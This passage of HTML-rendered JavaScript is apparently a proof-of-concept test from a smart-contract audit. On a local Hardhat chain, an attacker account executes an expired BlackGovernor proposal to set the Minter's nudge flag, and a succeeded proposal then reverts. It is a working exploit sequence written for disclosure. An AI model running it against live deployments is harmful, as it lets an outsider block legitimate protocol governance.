const endOfBeforeEachTimestamp = (await ethers.provider.getBlock(\u0026quot;latest\u0026quot;)).timestamp;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const proposerSMNFTVotesAtSetupEnd = await votingEscrow.getsmNFTPastVotes(proposerEOA.address, endOfBeforeEachTimestamp);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(`  End of beforeEach: Proposer smNFT Votes (current ts): ${ethers.utils.formatEther(proposerSMNFTVotesAtSetupEnd)} BLACK`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const veTotalSupplyAtSetupEnd = await votingEscrow.getPastTotalSupply(endOfBeforeEachTimestamp);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(`  End of beforeEach: VE TotalSupply (current ts): ${ethers.utils.formatEther(veTotalSupplyAtSetupEnd)} BLACK`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const currentThreshAtSetupEnd = await blackGovernor.proposalThreshold(); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(`  End of beforeEach: BlackGovernor Threshold (current ts, numerator 0): ${ethers.utils.formatEther(currentThreshAtSetupEnd)} BLACK`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;Advancing Minter to Tail Emission phase...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        if (typeof minterUpgradeable.connect(deployer)._initialize === \u0026#39;function\u0026#39;) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e             try { \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e                 await minterUpgradeable.connect(deployer)._initialize([], [], 0); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e                 console.log(\u0026quot;  MinterUpgradeable._initialize() called or already handled.\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e             } catch (e) { \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e                 console.log(\u0026quot;  MinterUpgradeable._initialize() likely already handled by proxy or guarded: \u0026quot;, e.message);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e             }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const TAIL_START = await minterUpgradeable.TAIL_START();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        let currentWeekly = await minterUpgradeable.weekly();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        let loopEpochCount = 0; \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const maxEpochsForSetup = 75; \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(`  Initial Minter weekly for tail phase: ${ethers.utils.formatEther(currentWeekly)}, TAIL_START: ${ethers.utils.formatEther(TAIL_START)}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        let minterEpochCountBeforeLoop = await minterUpgradeable.epochCount();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(`  Minter internal epochCount before loop: ${minterEpochCountBeforeLoop.toString()}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        while(currentWeekly.gte(TAIL_START) \u0026amp;\u0026amp; loopEpochCount \u0026lt; maxEpochsForSetup) { \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            const currentActivePeriodForMinter = await minterUpgradeable.active_period();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            const currentTimeForMinter = (await ethers.provider.getBlock(\u0026quot;latest\u0026quot;)).timestamp;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            if (currentTimeForMinter \u0026lt; currentActivePeriodForMinter.add(CONTRACT_WEEK)) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e                const timeToAdvance = currentActivePeriodForMinter.add(CONTRACT_WEEK).sub(currentTimeForMinter).toNumber() + 60;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e                await advanceTime(timeToAdvance); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            await minterUpgradeable.connect(deployer).update_period();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            currentWeekly = await minterUpgradeable.weekly();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            loopEpochCount++;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const finalMinterEpochCount = await minterUpgradeable.epochCount();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        expect(currentWeekly).to.be.lt(TAIL_START, `Minter did not reach tail emission phase after ${loopEpochCount} loop iterations (Minter epoch: ${finalMinterEpochCount.toString()}). Current weekly: ${ethers.utils.formatEther(currentWeekly)}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(`Minter in Tail Emission. Minter epochCount: ${finalMinterEpochCount.toString()}, Weekly: ${ethers.utils.formatEther(currentWeekly)}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;beforeEach setup complete.\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    });\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    it(\u0026quot;should allow attacker to execute an Expired proposal to grief Minter.nudge() and block a Succeeded proposal\u0026quot;, async function () {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const targets = [minterUpgradeable.address];\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const values = [0];\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const calldatas = [nudgeCalldata]; \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const descriptionExpired = \u0026quot;Prop EXPIRED - Nudge\u0026quot;;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const descriptionSucceeded = \u0026quot;Prop SUCCEED - Nudge\u0026quot;;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;Proposing PROP_EXPIRED...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        // Get state for the block *before* the one `propose` will be in\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await advanceTime(1); // Ensure we are in a new block if previous tx was in same block\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const blockAboutToExpire = await ethers.provider.getBlock(\u0026quot;latest\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const timestampForGetVotesExpired = blockAboutToExpire.timestamp; \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const blockNumberForGetVotesExpired = blockAboutToExpire.number;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        // These calls simulate what Governor\u0026#39;s getVotes(account, block.number-1) and proposalThreshold() will do\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        // Note: `getVotes` in L2Governor takes blockNumber but L2GovernorVotes._getVotes uses it as timestamp\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const proposerVotesForExpiredCheck = await blackGovernor.getVotes(proposerEOA.address, blockNumberForGetVotesExpired);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const thresholdForExpiredCheck = await blackGovernor.proposalThreshold(); // Uses current block.timestamp for its internal VE call\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(`  Proposer EOA: ${proposerEOA.address}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(`  Block number for PROP_EXPIRED getVotes snapshot: ${blockNumberForGetVotesExpired}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(`  Proposer\u0026#39;s votes for PROP_EXPIRED (using block num as ts): ${ethers.utils.formatEther(proposerVotesForExpiredCheck)}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(`  Proposal Threshold for PROP_EXPIRED (using current ts): ${ethers.utils.formatEther(thresholdForExpiredCheck)}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        // This expect is the key debug point\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        expect(proposerVotesForExpiredCheck).to.be.gte(thresholdForExpiredCheck, \u0026quot;PoC PRE-CHECK FAILED: Proposer EOA votes should be \u0026gt;= threshold for PROP_EXPIRED\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        let txPropExpired = await blackGovernor.connect(proposerEOA).propose(targets, values, calldatas, descriptionExpired);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        let receiptPropExpired = await txPropExpired.wait();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const proposalId_Expired = receiptPropExpired.events.find(e =\u0026gt; e.event === \u0026quot;ProposalCreated\u0026quot;).args.proposalId;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const actualCreationTimestampExpired = (await ethers.provider.getBlock(receiptPropExpired.blockNumber)).timestamp;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const epochTimeHash_Expired = ethers.utils.hexZeroPad(ethers.utils.hexlify(calculateEpochNextJS(actualCreationTimestampExpired)), 32);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;Proposing PROP_SUCCEED...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const currentEpochNextForExpired = calculateEpochNextJS(actualCreationTimestampExpired);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        let timeToAdvanceForNewBTLWeek = currentEpochNextForExpired.sub(actualCreationTimestampExpired).toNumber() + 60; \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        if (timeToAdvanceForNewBTLWeek \u0026lt;= 60) { \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            timeToAdvanceForNewBTLWeek += CONTRACT_WEEK;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await advanceTime(timeToAdvanceForNewBTLWeek); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await advanceTime(1);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const blockForSucceededProposal = await ethers.provider.getBlock(\u0026quot;latest\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const timestampForGetVotesSucceed = blockForSucceededProposal.timestamp;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const blockNumberForGetVotesSucceed = blockForSucceededProposal.number;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const proposerVotesForSucceedCheck = await blackGovernor.getVotes(proposerEOA.address, blockNumberForGetVotesSucceed);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const thresholdForSucceedCheck = await blackGovernor.proposalThreshold();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        expect(proposerVotesForSucceedCheck).to.be.gte(thresholdForSucceedCheck, \u0026quot;PoC PRE-CHECK FAILED: Proposer EOA votes should be \u0026gt;= threshold for PROP_SUCCEED\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        let txPropSucceed = await blackGovernor.connect(proposerEOA).propose(targets, values, calldatas, descriptionSucceeded);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        let receiptPropSucceed = await txPropSucceed.wait();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const proposalId_Succeed = receiptPropSucceed.events.find(e =\u0026gt; e.event === \u0026quot;ProposalCreated\u0026quot;).args.proposalId;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const actualCreationTimestampSucceeded = (await ethers.provider.getBlock(receiptPropSucceed.blockNumber)).timestamp;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const epochTimeHash_Succeed = ethers.utils.hexZeroPad(ethers.utils.hexlify(calculateEpochNextJS(actualCreationTimestampSucceeded)), 32);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        expect(epochTimeHash_Expired).to.not.equal(epochTimeHash_Succeed, \u0026quot;EpochTimeHashes for proposals must be different!\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(`  epochTimeHash_Expired: ${epochTimeHash_Expired}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(`  epochTimeHash_Succeed: ${epochTimeHash_Succeed}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;Advancing time for PROP_EXPIRED to expire...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        let deadlineExpired = await blackGovernor.proposalDeadline(proposalId_Expired);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        let currentTime = (await ethers.provider.getBlock(\u0026quot;latest\u0026quot;)).timestamp;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        if (deadlineExpired.gt(currentTime)) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            await advanceTime(deadlineExpired.sub(currentTime).toNumber() + 60); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        expect(await blackGovernor.state(proposalId_Expired)).to.equal(6); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;PROP_EXPIRED is Expired.\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;Voting for PROP_SUCCEED...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        let snapshotSucceed = await blackGovernor.proposalSnapshot(proposalId_Succeed);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        currentTime = (await ethers.provider.getBlock(\u0026quot;latest\u0026quot;)).timestamp;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        if (snapshotSucceed.gt(currentTime)) { \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            await advanceTime(snapshotSucceed.sub(currentTime).toNumber() + 60); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await blackGovernor.connect(smVoter1EOA).castVote(proposalId_Succeed, 1); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await blackGovernor.connect(smVoter2EOA).castVote(proposalId_Succeed, 1); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;Votes cast for PROP_SUCCEED.\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        let deadlineSucceed = await blackGovernor.proposalDeadline(proposalId_Succeed);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        currentTime = (await ethers.provider.getBlock(\u0026quot;latest\u0026quot;)).timestamp;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        if (deadlineSucceed.gt(currentTime)) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            await advanceTime(deadlineSucceed.sub(currentTime).toNumber() + 60); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        expect(await blackGovernor.state(proposalId_Succeed)).to.equal(4); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;PROP_SUCCEED is Succeeded.\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;Advancing Minter to a new active period for nudge...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        let minterActivePeriodForNudge = await minterUpgradeable.active_period();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const currentBlockTimeForUpkeep = (await ethers.provider.getBlock(\u0026quot;latest\u0026quot;)).timestamp;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        if (currentBlockTimeForUpkeep \u0026lt; minterActivePeriodForNudge.add(CONTRACT_WEEK)) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            await advanceTime(minterActivePeriodForNudge.add(CONTRACT_WEEK).sub(currentBlockTimeForUpkeep).toNumber() + 60);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await minterUpgradeable.connect(deployer).update_period(); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        let targetEmissionPeriod = await minterUpgradeable.active_period(); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        expect(await minterUpgradeable.proposals(targetEmissionPeriod)).to.be.false;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const initialTailRate = await minterUpgradeable.tailEmissionRate(); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(`Attacker executing Expired Proposal ID: ${proposalId_Expired.toString()} for Minter period ${targetEmissionPeriod.toString()}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await blackGovernor.connect(attackerEOA).execute(targets, values, calldatas, epochTimeHash_Expired);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        expect(await minterUpgradeable.proposals(targetEmissionPeriod)).to.be.true;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        expect(await minterUpgradeable.tailEmissionRate()).to.equal(initialTailRate); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;Expired proposal executed by attacker, nudge flag set for period. Tail rate unchanged.\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(`Attempting to execute Succeeded Proposal ID: ${proposalId_Succeed.toString()} for Minter period ${targetEmissionPeriod.toString()}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await expect(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            blackGovernor.connect(deployer).execute(targets, values, calldatas, epochTimeHash_Succeed)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        ).to.be.revertedWith(\u0026quot;Governor: call reverted without message\u0026quot;); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan 